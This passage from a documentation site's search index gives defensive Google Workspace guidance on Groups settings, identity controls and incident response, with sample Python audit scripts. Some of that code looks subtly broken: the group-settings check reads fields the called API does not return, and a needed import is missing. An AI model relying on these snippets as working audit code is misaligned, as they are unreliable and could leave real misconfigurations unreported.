approaches:</p>"},{"location":"google-groups-security/#1-internal-collaboration-groups","title":"1. Internal Collaboration Groups","text":"<pre><code>Admin Console &gt; Groups &gt; Manage Group\n- Configure \"Access Type\" as \"Team\"\n- Set \"Who can join\" to \"Only invited users\"\n- Configure \"Who can view conversations\" to \"All group members\"\n- Set \"Who can view membership\" to \"All group members\"\n- Configure \"Who can post\" to \"All group members\"\n</code></pre>"},{"location":"google-groups-security/#2-external-collaboration-groups","title":"2. External Collaboration Groups","text":"<pre><code>Admin Console &gt; Groups &gt; Manage Group\n- Configure \"Access Type\" as \"Team\"\n- Set explicit membership with careful external additions\n- Configure \"Who can view conversations\" to \"All group members\"\n- Set \"Who can post\" to \"All group members or invited authors\"\n- Implement moderation for external posts if needed\n</code></pre>"},{"location":"google-groups-security/#3-announcement-groups","title":"3. Announcement Groups","text":"<pre><code>Admin Console &gt; Groups &gt; Manage Group\n- Configure \"Access Type\" as \"Announcement Only\"\n- Restrict posting capabilities to authorized users\n- Set \"Who can view conversations\" based on content sensitivity\n- Configure \"Who can view membership\" based on requirements\n- Set appropriate external access restrictions\n</code></pre>"},{"location":"google-groups-security/#4-security-and-admin-groups","title":"4. Security and Admin Groups","text":"<pre><code>Admin Console &gt; Groups &gt; Manage Group\n- Configure \"Access Type\" as \"Restricted\"\n- Set \"Who can view conversations\" to \"Group members\"\n- Configure \"Who can view membership\" to \"Group owners and managers\"\n- Apply stricter naming conventions\n- Implement regular membership reviews\n</code></pre>"},{"location":"google-groups-security/#enhanced-security-configuration","title":"Enhanced Security Configuration","text":"<p>Implement these additional controls for sensitive environments:</p> <ol> <li> <p>Content Control Settings <pre><code>Admin Console &gt; Groups &gt; Groups Settings\n- Configure \"Message moderation\" for sensitive groups\n- Set appropriate \"Attachment sharing\" restrictions\n- Control \"External posting\" capabilities\n</code></pre></p> </li> <li> <p>Information Rights Management <pre><code>Admin Console &gt; Groups &gt; Groups Settings\n- Configure appropriate \"Sharing outside the group\" settings\n- Set \"Content sharing\" restrictions\n- Implement DLP policies for group content\n</code></pre></p> </li> <li> <p>Advanced Access Controls <pre><code>Admin Console &gt; Groups &gt; Groups Settings &gt; Advanced settings\n- Configure \"Subject prefix\" for easy identification\n- Set appropriate \"Maximum message size\"\n- Configure \"Collaborative inbox\" settings\n</code></pre></p> </li> </ol>"},{"location":"google-groups-security/#security-monitoring-and-remediation","title":"Security Monitoring and Remediation","text":""},{"location":"google-groups-security/#group-security-auditing","title":"Group Security Auditing","text":"<p>Implement comprehensive auditing procedures:</p> <ol> <li> <p>Group Inventory Management <pre><code># Python script to inventory all Google Groups\nfrom googleapiclient.discovery import build\nfrom oauth2client.service_account import ServiceAccountCredentials\n\ndef inventory_all_groups(admin_sdk_service):\n    \"\"\"Create comprehensive inventory of all Google Groups\"\"\"\n    groups = []\n    page_token = None\n    \n    # Retrieve all groups\n    while True:\n        results = admin_sdk_service.groups().list(\n            domain='your-domain.com',\n            pageToken=page_token,\n            maxResults=200\n        ).execute()\n        \n        groups.extend(results.get('groups', []))\n        \n        page_token = results.get('nextPageToken')\n        if not page_token:\n            break\n    \n    # Enrich with additional group information\n    enriched_groups = []\n    for group in groups:\n        group_email = group['email']\n        \n        # Get group settings\n        try:\n            settings = admin_sdk_service.groups().get(\n                groupUniqueId=group_email\n            ).execute()\n            \n            # Get group members\n            members = get_group_members(admin_sdk_service, group_email)\n            \n            enriched_groups.append({\n                'email': group_email,\n                'name': group.get('name', ''),\n                'description': group.get('description', ''),\n                'settings': settings,\n                'members': members,\n                'member_count': len(members)\n            })\n        except Exception as e:\n            print(f\"Error processing group {group_email}: {str(e)}\")\n    \n    return enriched_groups\n\ndef get_group_members(admin_sdk_service, group_email):\n    \"\"\"Get members for a specific group\"\"\"\n    members = []\n    page_token = None\n    \n    while True:\n        results = admin_sdk_service.members().list(\n            groupKey=group_email,\n            pageToken=page_token,\n            maxResults=200\n        ).execute()\n        \n        members.extend(results.get('members', []))\n        \n        page_token = results.get('nextPageToken')\n        if not page_token:\n            break\n    \n    return members\n</code></pre></p> </li> <li> <p>Security Configuration Assessment <pre><code># Python script to assess group security configurations\ndef assess_group_security(groups):\n    \"\"\"Evaluate security posture of Google Groups\"\"\"\n    security_issues = []\n    \n    for group in groups:\n        # Check for public access\n        if 'whoCanViewGroup' in group['settings'] and group['settings']['whoCanViewGroup'] == 'ANYONE_CAN_VIEW':\n            security_issues.append({\n                'group': group['email'],\n                'issue': 'public_access',\n                'description': 'Group viewable by anyone',\n                'severity': 'high'\n            })\n        \n        # Check for external membership\n        if 'allowExternalMembers' in group['settings'] and group['settings']['allowExternalMembers'] == 'true':\n            security_issues.append({\n                'group': group['email'],\n                'issue': 'external_members_allowed',\n                'description': 'Group allows external members',\n                'severity': 'medium'\n            })\n        \n        # Check for self-service joining\n        if 'whoCanJoin' in group['settings'] and group['settings']['whoCanJoin'] in ['ALL_IN_DOMAIN_CAN_JOIN', 'ANYONE_CAN_JOIN']:\n            security_issues.append({\n                'group': group['email'],\n                'issue': 'self_service_joining',\n                'description': 'Users can join without approval',\n                'severity': 'medium'\n            })\n        \n        # Check for external message posting\n        if 'whoCanPostMessage' in group['settings'] and group['settings']['whoCanPostMessage'] == 'ANYONE_CAN_POST':\n            security_issues.append({\n                'group': group['email'],\n                'issue': 'anyone_can_post',\n                'description': 'Anyone can post messages',\n                'severity': 'medium'\n            })\n        \n        # Check for sensitive group patterns\n        if any(term in group['name'].lower() or term in group['email'].lower() \n               for term in ['security', 'admin', 'finance', 'hr', 'exec']):\n            if 'whoCanViewMembership' in group['settings'] and group['settings']['whoCanViewMembership'] != 'ALL_MANAGERS_CAN_VIEW':\n                security_issues.append({\n                    'group': group['email'],\n                    'issue': 'sensitive_group_exposure',\n                    'description': 'Sensitive group with exposed membership',\n                    'severity': 'high'\n                })\n    \n    return security_issues\n</code></pre></p> </li> <li> <p>Group Activity Monitoring <pre><code># Python script to monitor Google Groups activity\ndef monitor_groups_activity(reports_service):\n    \"\"\"Monitor for suspicious Google Groups activities\"\"\"\n    # Get groups activity events\n    group_events = reports_service.activities().list(\n        userKey='all',\n        applicationName='groups',\n        eventName='ADD_TO_GROUP,CREATE_GROUP,CHANGE_GROUP_SETTING',\n        maxResults=1000\n    ).execute()\n    \n    suspicious_activities = []\n    \n    for event in group_events.get('items', []):\n        # Extract event details\n        event_name = event.get('events', [{}])[0].get('name')\n        parameters = event.get('events', [{}])[0].get('parameters', [])\n        \n        # Check for suspicious group creation\n        if event_name == 'CREATE_GROUP':\n            group_name = next((p.get('value') for p in parameters \n                              if p.get('name') == 'group_name'), '')\n            \n            # Check for suspicious naming patterns\n            suspicious_terms = ['admin', 'security', 'finance', 'payroll', 'hr', 'exec']\n            if any(term in group_name.lower() for term in suspicious_terms):\n                suspicious_activities.append({\n                    'user': event['actor']['email'],\n                    'activity': 'suspicious_group_creation',\n                    'details': f\"Created potentially sensitive group: {group_name}\",\n                    'timestamp': event.get('id', {}).get('time')\n                })\n        \n        # Check for suspicious setting changes\n        if event_name == 'CHANGE_GROUP_SETTING':\n            group_email = next((p.get('value') for p in parameters \n                               if p.get('name') == 'group_email'), '')\n            setting_name = next((p.get('value') for p in parameters \n                                if p.get('name') == 'setting_name'), '')\n            new_value = next((p.get('value') for p in parameters \n                             if p.get('name') == 'new_value'), '')\n            \n            # Check for security-weakening changes\n            if is_security_weakening_change(setting_name, new_value):\n                suspicious_activities.append({\n                    'user': event['actor']['email'],\n                    'activity': 'security_weakening_change',\n                    'details': f\"Changed {setting_name} to {new_value} for group {group_email}\",\n                    'timestamp': event.get('id', {}).get('time')\n                })\n    \n    return suspicious_activities\n\ndef is_security_weakening_change(setting_name, new_value):\n    \"\"\"Determine if a setting change weakens security\"\"\"\n    weakening_changes = {\n        'WHO_CAN_JOIN': ['ALL_IN_DOMAIN_CAN_JOIN', 'ANYONE_CAN_JOIN'],\n        'WHO_CAN_VIEW_GROUP': ['ALL_IN_DOMAIN_CAN_VIEW', 'ANYONE_CAN_VIEW'],\n        'WHO_CAN_VIEW_MEMBERSHIP': ['ALL_IN_DOMAIN_CAN_VIEW', 'ANYONE_CAN_VIEW'],\n        'WHO_CAN_POST_MESSAGE': ['ALL_IN_DOMAIN_CAN_POST', 'ANYONE_CAN_POST'],\n        'ALLOW_EXTERNAL_MEMBERS': ['true'],\n        'ALLOW_WEB_POSTING': ['true'],\n        'IS_ARCHIVED': ['false']\n    }\n    \n    return setting_name in weakening_changes and new_value in weakening_changes[setting_name]\n</code></pre></p> </li> </ol>"},{"location":"google-groups-security/#remediation-procedures","title":"Remediation Procedures","text":"<p>Implement structured remediation for common security issues:</p>"},{"location":"google-groups-security/#1-excessive-public-access-remediation","title":"1. Excessive Public Access Remediation","text":"<pre><code>Admin Console &gt; Groups &gt; Select group &gt; Access Settings\n- Change \"Access Type\" to appropriate level\n- Set \"Who can view conversations\" to \"Group members\"\n- Configure \"Who can view members\" to \"Group members\"\n- Apply consistent settings to similar groups\n</code></pre>"},{"location":"google-groups-security/#2-self-service-group-joining-remediation","title":"2. Self-Service Group Joining Remediation","text":"<pre><code>Admin Console &gt; Groups &gt; Select group &gt; Membership Settings\n- Set \"Who can join the group\" to \"Only invited users\"\n- Review current membership for unauthorized access\n- Configure appropriate management settings\n- Consider migration to more secure group if needed\n</code></pre>"},{"location":"google-groups-security/#3-unauthorized-external-access-remediation","title":"3. Unauthorized External Access Remediation","text":"<pre><code>Admin Console &gt; Groups &gt; Select group &gt; Members\n- Review external members for appropriateness\n- Remove unauthorized external members\n- Configure \"Allow members from outside your organization\" based on requirements\n- Implement monitoring for external member addition\n</code></pre>"},{"location":"google-groups-security/#incident-response-for-group-based-attacks","title":"Incident Response for Group-Based Attacks","text":"<p>Develop incident response procedures for Google Groups security incidents:</p> <ol> <li>Initial Assessment</li> <li>Identify affected groups and potential information exposure</li> <li>Determine scope of unauthorized access</li> <li>Assess any data exfiltration or missuse</li> <li> <p>Review group activity logs for suspicious patterns</p> </li> <li> <p>Containment Actions</p> </li> <li>Change group security settings to restrict access</li> <li>Suspend unauthorized users or external members</li> <li>Remove unapproved content from group</li> <li> <p>Block external access if necessary</p> </li> <li> <p>Group Security Restoration</p> </li> <li>Implement appropriate security settings</li> <li>Review and update membership list</li> <li>Verify content is appropriate and authorized</li> <li>Configure enhanced monitoring</li> </ol>"},{"location":"google-groups-security/#advanced-group-security-strategies","title":"Advanced Group Security Strategies","text":""},{"location":"google-groups-security/#group-security-governance-framework","title":"Group Security Governance Framework","text":"<p>Implement a comprehensive governance approach:</p> <ol> <li>Group Lifecycle Management</li> <li>Develop formal group creation approval process</li> <li>Implement standardized group configuration templates</li> <li>Create periodic review and recertification procedures</li> <li> <p>Establish group deprecation and archiving workflows</p> </li> <li> <p>Group Classification System</p> </li> <li>Develop group sensitivity classification scheme</li> <li>Implement naming conventions indicating security level</li> <li>Configure security controls based on classification</li> <li> <p>Apply appropriate monitoring based on sensitivity</p> </li> <li> <p>Group Owner Responsibilities</p> </li> <li>Define clear ownership responsibilities</li> <li>Provide security training for group owners</li> <li>Create owner acknowledgment process</li> <li>Implement regular compliance checking</li> </ol>"},{"location":"google-groups-security/#security-optimization-techniques","title":"Security Optimization Techniques","text":"<p>Implement these advanced techniques for enhanced security:</p> <ol> <li>Group Consolidation</li> <li>Identify redundant or overlapping groups</li> <li>Merge similar groups to reduce management overhead</li> <li>Standardize group purposes and membership</li> <li> <p>Implement consistent security across similar groups</p> </li> <li> <p>Group Access Reviews</p> </li> <li>Conduct quarterly membership reviews</li> <li>Verify appropriate external access</li> <li>Validate group purpose still relevant</li> <li> <p>Confirm security settings meet requirements</p> </li> <li> <p>Group Security Metrics</p> </li> <li>Track security posture across groups</li> <li>Measure remediation effectiveness</li> <li>Monitor group proliferation and usage</li> <li>Report on security trends and improvements</li> </ol>"},{"location":"google-groups-security/#msp-specific-considerations","title":"MSP-Specific Considerations","text":""},{"location":"google-groups-security/#multi-tenant-group-management","title":"Multi-Tenant Group Management","text":"<p>For MSPs managing multiple Google Workspace environments:</p> <ol> <li>Cross-Client Standardization</li> <li>Develop consistent group security baselines</li> <li>Create standardized naming conventions</li> <li>Implement common governance framework</li> <li> <p>Establish consistent monitoring approach</p> </li> <li> <p>Client-Specific Customization</p> </li> <li>Adapt security controls to client requirements</li> <li>Document client-specific exceptions</li> <li>Implement appropriate delegation model</li> <li> <p>Create client-specific reporting</p> </li> <li> <p>Efficient Management Practices</p> </li> <li>Develop multi-tenant management tools</li> <li>Create efficient audit procedures</li> <li>Implement security templates by client type</li> <li>Establish cross-client metrics and benchmarks</li> </ol>"},{"location":"google-groups-security/#client-onboarding-and-migration","title":"Client Onboarding and Migration","text":"<p>Implement specific procedures for client Google Groups migration:</p> <ol> <li>Group Discovery and Assessment</li> <li>Inventory existing groups across platforms</li> <li>Assess current security configurations</li> <li>Identify high-risk or sensitive groups</li> <li> <p>Document external sharing relationships</p> </li> <li> <p>Security-Focused Migration</p> </li> <li>Implement \"secure by default\" configurations</li> <li>Apply appropriate security templates</li> <li>Validate security settings post-migration</li> <li> <p>Create enhanced monitoring for migrated groups</p> </li> <li> <p>Post-Migration Security Review</p> </li> <li>Conduct comprehensive security assessment</li> <li>Identify remaining security gaps</li> <li>Implement remediation plan for issues</li> <li>Provide security recommendations report</li> </ol>"},{"location":"google-groups-security/#tools-for-google-groups-security-assessment","title":"Tools for Google Groups Security Assessment","text":""},{"location":"google-groups-security/#gubble-google-groups-security-auditing-tool","title":"Gubble: Google Groups Security Auditing Tool","text":"<p>Gubble by Graham Helton and Low Orbit Security is a specialized security assessment tool designed specifically for auditing Google Groups configurations.</p> <p>Key Capabilities: - Automates identification of high-risk group configurations - Analyzes critical permission settings that could lead to security issues - Reports on groups that could be exploited during penetration testing - Checks for common misconfigurations and excessive permissions</p> <p>Implementation Example: <pre><code># Install and run Gubble for Google Groups security assessment\ngit clone https://github.com/LowOrbitSecurity/gubble.git\ncd gubble\n\n# Set up authentication with required OAuth scopes:\n# - admin.directory.group.readonly\n# - apps.groups.settings\n\n# Run the tool against your domain\npython3 gubble.py -c credentials.json -d yourdomain.com\n</code></pre></p> <p>Security Risks Identified: - Groups allowing anyone in the domain to join (potential privilege escalation) - Groups permitting external members (data exfiltration risk) - Groups with overly permissive viewing permissions (information disclosure) - Groups where members can post as the group (phishing vector)</p> <p>Consider integrating Gubble into your regular security assessment process to automatically identify and remediate Google Groups security misconfigurations.</p>"},{"location":"google-groups-security/#additional-resources-and-documentation","title":"Additional Resources and Documentation","text":"<ul> <li>Google Workspace Admin Help: Google Groups</li> <li>Google Groups Settings API</li> <li>Google Admin SDK Directory API</li> <li>NIST SP 800-53: Access Control</li> </ul> <p>Note: This guide should be adapted to your organization's specific Google Workspace configuration and requirements.</p>"},{"location":"identity-security/","title":"Identity Security","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"identity-security/#identity-and-access-security-in-google-workspace","title":"Identity and Access Security in Google Workspace","text":"<p>This guide provides detailed strategies for implementing robust identity security in Google Workspace environments, with a focus on practices relevant to MSPs and SMBs.</p>"},{"location":"identity-security/#understanding-the-identity-security-landscape","title":"Understanding the Identity Security Landscape","text":"<p>In Google Workspace, identity is the foundation of your security posture. Compromised identities are among the most common attack vectors, enabling threat actors to:</p> <ul> <li>Access sensitive company data</li> <li>Launch lateral movement attacks</li> <li>Establish persistence</li> <li>Exfiltrate information</li> <li>Deploy ransomware or other malicious payloads</li> </ul>"},{"location":"identity-security/#critical-identity-controls","title":"Critical Identity Controls","text":""},{"location":"identity-security/#1-multi-factor-authentication-mfa","title":"1. Multi-Factor Authentication (MFA)","text":"<p>MFA is your most effective defense against account compromise. Implement a tiered approach:</p>"},{"location":"identity-security/#tier-1-basic-minimum-requirement","title":"Tier 1: Basic (Minimum Requirement)","text":"<ul> <li>Google Authenticator: Time-based one-time passwords</li> <li>SMS/Voice verification: Less secure but better than no MFA</li> <li>Email verification codes: For lower-risk scenarios</li> </ul>"},{"location":"identity-security/#tier-2-enhanced-security","title":"Tier 2: Enhanced Security","text":"<ul> <li>Security keys: FIDO U2F or FIDO2 hardware keys</li> <li>Google Titan Security Keys: Purpose-built hardware security</li> <li>Integrated device verification: For managed devices</li> </ul>"},{"location":"identity-security/#tier-3-zero-trust-implementation","title":"Tier 3: Zero Trust Implementation","text":"<ul> <li>Context-aware access: Location, device, and risk-based authentication</li> <li>Continuous verification: Session-based reauthentication</li> <li>Adaptive risk scoring: ML-based anomaly detection</li> </ul>"},{"location":"identity-security/#context-aware-access-implementation","title":"Context-Aware Access Implementation","text":"<p>Context-Aware Access enables granular access control based on contextual attributes to enforce Zero Trust principles:</p>"},{"location":"identity-security/#key-capabilities","title":"Key Capabilities","text":"<ul> <li>User identity verification: Strong authentication based on user identity</li> <li>Device security posture: Access decisions based on device security state</li> <li>Location awareness: Limiting access based on geographic location</li> <li>Resource sensitivity: Varying security requirements based on data sensitivity</li> <li>Temporal conditions: Time-based access restrictions</li> </ul>"},{"location":"identity-security/#implementation-steps","title":"Implementation Steps","text":"<ol> <li>Define access levels: Create access levels based on IP ranges, geographic locations, and device policies</li> <li>Configure access policies: Apply access levels to Google Workspace services</li> <li>Set up device validation: Implement device security requirements with endpoint verification</li> <li>Create security groups: Group users by access requirements</li> <li>Apply tiered access: Implement least-privilege access by service and data sensitivity</li> </ol>"},{"location":"identity-security/#advanced-context-aware-configuration","title":"Advanced Context-Aware Configuration","text":"<ul> <li>Conditional access by OU: Different policies for different organizational units</li> <li>Service-specific policies: Tailored restrictions for Gmail, Drive, Meet, etc.</li> <li>API access control: Context-based restrictions for API access</li> <li>Third-party application integration: Extend context-aware access to connected applications</li> <li>Real-time policy enforcement: Dynamic access decisions based on changing conditions</li> </ul> <p>For detailed configuration instructions, refer to Google's official Context-Aware Access guide.</p>"},{"location":"identity-security/#phishing-resistant-mfa-implementation","title":"Phishing-Resistant MFA Implementation","text":"<p>Phishing-resistant MFA methods provide significantly stronger protection than standard MFA:</p> <ul> <li>Hardware security keys: Physical FIDO2/WebAuthn keys that cryptographically verify both the user and the destination site</li> <li>Passkeys: Modern authentication method tied to device biometrics with phishing resistance</li> <li>Platform authenticators: Built-in security features in devices that support FIDO standards</li> </ul>"},{"location":"identity-security/#benefits-of-phishing-resistant-mfa","title":"Benefits of Phishing-Resistant MFA","text":"<ul> <li>Prevents credential theft even if users are tricked by sophisticated phishing attempts</li> <li>Verifies both the user identity and the legitimacy of the service being accessed</li> <li>Eliminates risks associated with OTPs, push notifications, and other interceptable verification methods</li> <li>Provides stronger protection against man-in-the-middle attacks</li> </ul>"},{"location":"identity-security/#hardware-key-management","title":"Hardware Key Management","text":"<ul> <li>Inventory tracking: Maintain a central registry of all issued hardware keys</li> <li>User assignment: Track which keys are assigned to which users</li> <li>Backup procedures: Ensure users have backup authentication methods or keys</li> <li>Revocation process: Implement clear procedures for when keys are lost or compromised</li> <li>Usage analytics: Monitor which users actively use hardware keys for authentication</li> </ul>"},{"location":"identity-security/#implementation-strategy-for-hardware-keys","title":"Implementation Strategy for Hardware Keys","text":"<ol> <li>Identify high-risk users: Start with admins and users with access to sensitive data</li> <li>Pilot program: Test with a small group before organization-wide deployment</li> <li>Procurement planning: Select compatible hardware keys that meet security requirements</li> <li>User training: Provide clear instructions on how to use and safeguard hardware keys</li> <li>Gradual enforcement: Begin with optional adoption, then require for specific actions, and finally mandate for all authentication</li> <li>Monitoring and compliance: Track adoption rates and enforce policies through conditional access</li> </ol>"},{"location":"identity-security/#enforcing-hardware-key-requirements","title":"Enforcing Hardware Key Requirements","text":"<p>In Google Workspace Admin Console: 1. Go to Security &gt; Authentication &gt; 2-Step Verification 2. Enable \"Require security key\" option for selected organizational units 3. Configure settings to only allow hardware security keys as 2SV methods 4. Set up alerts for authentication attempts that don't use hardware keys</p>"},{"location":"identity-security/#reporting-on-hardware-key-usage","title":"Reporting on Hardware Key Usage","text":"<p>To gain visibility into hardware key adoption: 1. Generate 2-Step Verification reports from Admin Console (Security &gt; Reports) 2. Monitor \"Login audit logs\" filtering for security key authentication events 3. Create custom alerts for users attempting to bypass hardware key requirements 4. Establish regular compliance reviews of hardware key usage across the organization</p>"},{"location":"identity-security/#implementation-strategy","title":"Implementation Strategy","text":"<ul> <li>Start with a pilot group of admin and high-value accounts</li> <li>Use enrollment campaigns with clear deadlines</li> <li>Monitor MFA adoption and enforce through conditional access policies</li> <li>Consider security key provisioning for privileged accounts</li> </ul>"},{"location":"identity-security/#2-password-policies-and-controls","title":"2. Password Policies and Controls","text":"<p>Even with MFA, password security remains critical:</p> <ul> <li>Strong password requirements: Enforce minimum length (12+ characters) and complexity</li> <li>Password rotation: Balance security with usability (90-180 days for standard accounts)</li> <li>Password breach detection: Enable Google's built-in compromised credential checking</li> <li>No password sharing: Implement delegate access instead of sharing credentials</li> <li>Password manager integration: Encourage use of secure password management</li> </ul>"},{"location":"identity-security/#3-super-admin-account-protection","title":"3. Super Admin Account Protection","text":"<p>Super Admin accounts require exceptional protection:</p> <ul> <li>Dedicated admin accounts: Separate from day-to-day user accounts</li> <li>Break-glass procedures: For emergency access to admin credentials</li> <li>Advanced Protection Program: For highest-value admin accounts</li> <li>Admin privilege segmentation: Implement least privilege for administrative roles</li> <li>Admin account activity logging: Enhanced monitoring for admin actions</li> </ul>"},{"location":"identity-security/#4-external-identity-management","title":"4. External Identity Management","text":"<p>Control how users authenticate with external services:</p> <ul> <li>SSO implementation: Centralize authentication through Google IdP</li> <li>SAML application onboarding: Secure integration of third-party services</li> <li>OAuth scope review: Regular audit of third-party application permissions</li> <li>External identity governance: Policies for B2B identity federation</li> <li>Consumer identity separation: Segregate consumer and corporate identity</li> </ul>"},{"location":"identity-security/#advanced-identity-security-techniques","title":"Advanced Identity Security Techniques","text":""},{"location":"identity-security/#account-takeover-prevention","title":"Account Takeover Prevention","text":"<p>Implement specific controls to detect and prevent account takeovers:</p> <ul> <li>Login challenge triggers: Based on suspicious location, device, or behavior</li> <li>Login velocity monitoring: Detect unusual patterns in authentication attempts</li> <li>Impossible travel detection: Flag authentications from geographically distant locations</li> <li>Authentication anomaly alerting: Notify security teams of suspicious login patterns</li> <li>Access suspension workflows: Automated or manual account freezing</li> </ul>"},{"location":"identity-security/#identity-threat-detection","title":"Identity Threat Detection","text":"<p>Develop capabilities to identify identity-based threats:</p> <ul> <li>Authentication log analysis: Regular review of login patterns and failures</li> <li>Permission change monitoring: Detection of privilege escalation</li> <li>OAuth token abuse detection: Identify suspicious application access</li> <li>Session hijacking detection: Monitor for indicators of session compromise</li> <li>Lateral movement identification: Track identity usage across services</li> </ul>"},{"location":"identity-security/#msp-specific-identity-management","title":"MSP-Specific Identity Management","text":"<p>MSP Considerations</p> <p>These guidelines are specifically designed for Managed Service Providers supporting multiple client Google Workspace environments.</p> <p>For MSPs managing multiple Google Workspace tenants:</p> <ul> <li>Cross-tenant identity governance: Consistent policies across client environments</li> <li>Delegated admin management: Secure partner access to client tenants</li> <li>Identity baseline templates: Standardized identity controls for new clients</li> <li>Tiered identity services: Different security levels based on client requirements</li> <li>Identity security reporting: Client-specific identity risk assessments</li> </ul>"},{"location":"identity-security/#implementation-checklist","title":"Implementation Checklist","text":"<p>Best Practices</p> <p>This checklist represents recommended security controls that align with industry best practices. Prioritize implementation based on your organization's risk profile and resources.</p> <ul> <li> Enable MFA for all user accounts, prioritizing privileged accounts</li> <li> Implement phishing-resistant MFA with hardware keys for administrators and high-risk users</li> <li> Create hardware key inventory and management procedures</li> <li> Implement strong password policies</li> <li> Configure enhanced security for Super Admin accounts</li> <li> Review and restrict third-party application access</li> <li> Implement alerting for suspicious authentication events</li> <li> Deploy SSO for all compatible applications</li> <li> Develop and test account recovery procedures</li> <li> Create user security awareness training for identity protection</li> <li> Establish regular identity security reviews</li> <li> Deploy Advanced Protection Program for high-value accounts</li> </ul>"},{"location":"identity-security/#threat-hunting-scenarios","title":"Threat Hunting Scenarios","text":""},{"location":"identity-security/#suspicious-oauth-grants","title":"Suspicious OAuth Grants","text":"<p>Monitor for and investigate: - OAuth grants to new or uncommon applications - Applications requesting unusual scopes - Multiple users authorizing the same suspicious application - OAuth grants occurring outside business hours</p>"},{"location":"identity-security/#authentication-anomalies","title":"Authentication Anomalies","text":"<p>Look for: - Failed login attempts followed by successful logins - Successful logins from unusual locations - Authentication pattern changes (time, location, device) - Password resets followed by immediate login activity - Disabled MFA followed by authentication from new location</p>"},{"location":"identity-security/#resources","title":"Resources","text":"<ul> <li>Google Workspace Admin Help: 2-Step Verification</li> <li>Google Advanced Protection Program</li> <li>Google Identity Services Documentation</li> <li>NIST 800-63 Digital Identity Guidelines</li> <li>CISA Phishing-Resistant MFA Fact Sheet</li> </ul> <p>Note: This guide should be adapted to your organization's specific needs and risk profile.</p>"},{"location":"incident-response-playbooks/","title":"Incident Response Playbooks","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"incident-response-playbooks/#google-workspace-incident-response-playbooks","title":"Google Workspace Incident Response Playbooks","text":"<p>This document provides comprehensive incident response playbooks for Google Workspace security incidents. These playbooks include detection, investigation, containment, eradication, recovery, and post-incident analysis phases for common Google Workspace security incidents.</p>"},{"location":"incident-response-playbooks/#playbook-structure","title":"Playbook Structure","text":"<p>Each incident response playbook follows a standardized structure:</p> <ol> <li>Incident Overview</li> <li>Description and potential impact</li> <li>Common attack vectors and indicators</li> <li> <p>Severity classification</p> </li> <li> <p>Detection and Analysis</p> </li> <li>Initial indicators and alerts</li> <li>Investigation procedures</li> <li> <p>Evidence collection guidance</p> </li> <li> <p>Containment Procedures</p> </li> <li>Immediate containment actions</li> <li>Secondary containment measures</li> <li> <p>Limiting incident spread</p> </li> <li> <p>Eradication Steps</p> </li> <li>Removing attacker access</li> <li>Eliminating persistence mechanisms</li> <li> <p>Validating complete removal</p> </li> <li> <p>Recovery Guidance</p> </li> <li>Service restoration</li> <li>Security posture strengthening</li> <li> <p>Return to normal operations</p> </li> <li> <p>Post-Incident Analysis</p> </li> <li>Root cause identification</li> <li>Lessons learned documentation</li> <li>Security improvements implementation</li> </ol>"},{"location":"incident-response-playbooks/#account-compromise-incident-response","title":"Account Compromise Incident Response","text":""},{"location":"incident-response-playbooks/#incident-overview","title":"Incident Overview","text":"<p>Description: Unauthorized access to one or more Google Workspace user accounts, potentially resulting in data theft, further access, or destructive actions.</p> <p>Common Attack Vectors: - Phishing campaigns targeting credentials - Password spraying or brute force attacks - OAuth token theft/abuse - Session hijacking - Recovery email/phone compromise</p> <p>Severity Classifications: - Critical: Admin account, executive, or multiple user compromises - High: Single user with access to sensitive data - Medium: Single user with limited access - Low: Service account with minimal permissions</p>"},{"location":"incident-response-playbooks/#detection-and-analysis","title":"Detection and Analysis","text":"<p>Initial Indicators: - Unusual login locations, times, or devices - Suspicious email forwarding rules or filters - Unexpected OAuth application authorizations - Unusual file access or download patterns - Password reset or recovery setting changes</p> <p>Investigation Procedures:</p> <ol> <li> <p>Login Activity Analysis <pre><code>Admin Console &gt; Reports &gt; Audit &gt; Login\n- Filter for affected user(s)\n- Identify suspicious login events (locations, devices, times)\n- Check access methods (browser, IMAP, API, mobile)\n- Verify if 2FA challenges succeeded or failed\n</code></pre></p> </li> <li> <p>Account Setting Changes <pre><code>Admin Console &gt; Reports &gt; Audit &gt; Account\n- Identify changes to recovery information\n- Check password reset activities\n- Verify 2FA enrollment or configuration changes\n</code></pre></p> </li> <li> <p>Email Configuration Review <pre><code>Admin Console &gt; Reports &gt; Audit &gt; Email logs\n- Check for newly created email filters\n- Identify email forwarding rules\n- Look for delegation settings changes\n</code></pre></p> </li> <li> <p>OAuth Application Assessment <pre><code>Admin Console &gt; Reports &gt; Audit &gt; Token\n- Review recently authorized applications\n- Check for suspicious or unusual permissions\n- Verify application usage patterns\n</code></pre></p> </li> <li> <p>User Activity Timeline Construction <pre><code># Python script to create comprehensive user activity timeline\ndef create_user_activity_timeline(reports_service, user_email, days_back=7):\n    \"\"\"Create a timeline of all user activities across Google Workspace\"\"\"\n    # Calculate start time (days back from now)\n    start_time = (datetime.now() - timedelta(days=days_back)).strftime('%Y-%m-%d')\n    \n    # Applications to query\n    applications = ['login', 'admin', 'drive', 'token', 'user_accounts', \n                    'groups', 'calendar', 'gmail', 'gcp']\n    \n    all_activities = []\n    \n    # Collect activities across all applications\n    for app in applications:\n        try:\n            results = reports_service.activities().list(\n                userKey=user_email,\n                applicationName=app,\n                startTime=start_time,\n                maxResults=1000\n            ).execute()\n            \n            if 'items' in results:\n                for item in results['items']:\n                    # Extract basic event info\n                    event = {\n                        'time': item.get('id', {}).get('time'),\n                        'application': app,\n                        'event_name': item.get('events', [{}])[0].get('name', 'unknown'),\n                        'ip_address': item.get('ipAddress', 'unknown'),\n                        'parameters': {}\n                    }\n                    \n                    # Extract parameters\n                    parameters = item.get('events', [{}])[0].get('parameters', [])\n                    for param in parameters:\n                        event['parameters'][param.get('name')] = param.get('value')\n                    \n                    all_activities.append(event)\n        except Exception as e:\n            print(f\"Error collecting {app} activities: {str(e)}\")\n    \n    # Sort all activities by timestamp\n    all_activities.sort(key=lambda x: x['time'])\n    \n    return all_activities\n</code></pre></p> </li> <li> <p>Evidence Collection</p> </li> <li>Capture screenshots of suspicious activities</li> <li>Export relevant logs for preservation</li> <li>Document all detected indicators</li> <li>Record incident timeline based on evidence</li> </ol>"},{"location":"incident-response-playbooks/#containment-procedures","title":"Containment Procedures","text":"<p>Immediate Actions:</p> <ol> <li> <p>Account Suspension <pre><code>Admin Console &gt; Directory &gt; Users\n- Locate compromised user(s)\n- Click \"More\" &gt; \"Suspend user\"\n- Document time of suspension\n</code></pre></p> </li> <li> <p>Password Reset 